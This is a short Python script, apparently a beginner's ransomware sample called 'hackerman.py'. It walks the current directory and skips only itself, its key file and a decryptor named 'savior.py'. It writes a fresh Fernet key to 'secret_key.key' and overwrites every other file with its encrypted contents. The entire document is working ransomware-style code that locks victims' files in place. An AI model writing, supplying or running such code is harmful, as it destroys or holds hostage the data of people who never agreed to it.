import os
from cryptography.fernet import Fernet

dont_touch_extensions = ["hackerman.py",'secret_key.key',"savior.py"] #files to ignore
nonallowed_files = [] #files to encrypt/hide

#iterates through current directory
for file in os.listdir(): 
    if file in dont_touch_extensions: #checks if current file in loop is in files to ignore list True -> skips to next file
        continue

    if os.path.isfile(file): #checks if current file in loop is a actual file not a folder True -> adds file to list to encrypt
        nonallowed_files.append(file)


# print(nonallowed_files)

key = Fernet.generate_key() #generates key for all encryptions

with open("secret_key.key","wb") as secret_key: #writes encryption key to seperate file 
    secret_key.write(key)


#iterates through list of files to encrypt 
for uncrypted_file in nonallowed_files: 
    with open(uncrypted_file,"rb") as file: #opens the current file in loop
        secret_content = file.read() #returns all content in current file in loop

    encryption = Fernet(key) #initializes encryption
    encrypted_data = encryption.encrypt(secret_content) #encrypts data in file
    # print(token)

    with open(uncrypted_file,"wb") as file: #opens file in loop and replaces data with encrypted bytes
        file.write(encrypted_data)
